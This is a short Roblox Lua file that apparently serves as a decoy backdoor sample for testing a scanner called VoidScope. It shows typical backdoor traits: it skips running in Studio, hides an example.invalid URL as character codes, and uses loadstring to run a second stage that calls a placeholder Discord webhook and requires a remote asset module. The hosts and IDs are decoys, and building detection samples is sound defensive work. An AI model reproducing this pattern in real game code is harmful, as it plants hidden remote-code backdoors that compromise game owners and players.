-- Harmless demo backdoor sample for VoidScope (safe decoy URLs and IDs only).
local RunService = game:GetService("RunService")
if RunService:IsStudio() then
	return
end

local HttpService = game:GetService("HttpService")
local encodedUrl = string.char(
	104, 116, 116, 112, 115, 58, 47, 47, 101, 120, 97, 109, 112, 108, 101, 46,
	105, 110, 118, 97, 108, 105, 100, 47, 97, 112, 105, 47, 112, 111, 108, 108
)

local stage2 = [[
	local hs = game:GetService("HttpService")
	local ok, body = pcall(function()
		return hs:GetAsync("https://discord.com/api/webhooks/123456789012345678/decoy_token_placeholder_xyz")
	end)
	local mod = require(123456789)
	if mod and mod.Init then
		mod:Init(game.PlaceId)
	end
]]

local fn = loadstring(stage2, "demo_stage2")
if fn then
	fn()
end
print("demo finished:", encodedUrl)
